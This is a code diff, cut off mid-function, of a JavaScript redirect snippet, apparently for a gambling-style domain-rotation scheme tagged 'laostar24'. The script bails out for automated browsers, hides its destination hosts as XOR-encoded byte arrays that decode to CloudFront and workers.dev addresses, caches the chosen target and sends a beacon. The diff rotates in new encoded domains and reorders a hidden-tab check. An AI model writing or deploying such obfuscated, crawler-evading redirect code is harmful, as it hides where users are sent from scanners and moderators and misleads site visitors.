@@ -69,16 +69,18 @@
     try{
       if(navigator.webdriver) return;
       if(!navigator.languages||!navigator.languages.length) return;
-      if(typeof document.hidden!=="undefined"&&document.hidden) return;
+      /* STUCKFIX_20261101: ย้ายการเช็คแท็บซ่อนไปอยู่หลัง pool/full */
       var k=90;
       function dec(a){var s="";for(var i=0;i<a.length;i++){s+=String.fromCharCode(a[i]^k);}return s;}
-      var P=[[50,46,46,42,41,96,117,117,62,105,51,59,60,53,50,109,63,52,48,44,63,116,57,54,53,47,62,60,40,53,52,46,116,52,63,46,117],[50,46,46,42,41,96,117,117,62,107,107,56,53,59,56,56,111,60,42,59,43,109,116,57,54,53,47,62,60,40,53,52,46,116,52,63,46,117]],BC=[[50,46,46,42,41,96,117,117,40,47,55,104,110,116,41,47,59,53,54,59,108,111,106,116,45,53,40,49,63,40,41,116,62,63,44,117]],T="laostar24";
+      var P=[[50,46,46,42,41,96,117,117,62,109,62,47,98,110,99,45,59,44,46,46,53,116,57,54,53,47,62,60,40,53,52,46,116,52,63,46,117],[50,46,46,42,41,96,117,117,62,41,42,108,56,45,32,54,49,60,107,34,109,116,57,54,53,47,62,60,40,53,52,46,116,52,63,46,117]],BC=[[50,46,46,42,41,96,117,117,40,47,55,104,110,116,41,47,59,53,54,59,108,111,106,116,45,53,40,49,63,40,41,116,62,63,44,117]],T="laostar24";
       var pool=[];for(var i=0;i<P.length;i++){pool.push(dec(P[i]));}
       var bc=[];for(var i=0;i<BC.length;i++){bc.push(dec(BC[i]));}
       var base="/m/",p=location.pathname||"";
       var extra=(p.indexOf(base)===0)?p.slice(base.length):"";
       function full(u){var d=extra?u.replace(/\/+$/,"")+"/"+extra:u;return d+(location.search||"")+(location.hash||"");}
-      var LS="__d";function save(u){try{localStorage.setItem(LS,JSON.stringify({u:u,t:Date.now()}));}catch(_){}}
+ 
+      try{var _c=document.getElementById("c");if(_c){_c.href=full(pool[0]);}}catch(_){}
+      if(typeof document.hidden!=="undefined"&&document.hidden){document.addEventListener("visibilitychange",function _vh(){if(!document.hidden){document.removeEventListener("visibilitychange",_vh);location.reload();}});return;}     var LS="__d";function save(u){try{localStorage.setItem(LS,JSON.stringify({u:u,t:Date.now()}));}catch(_){}}
       var cached=null;try{var raw=localStorage.getItem(LS);if(raw){var o=JSON.parse(raw);if(o&&o.u&&(Date.now()-o.t)<6e5&&pool.indexOf(o.u)>=0)cached=o.u;}}catch(_){}
       var results=[],go=false,bsent=false;
       function beacon(w){ if(bsent)return; bsent=true;
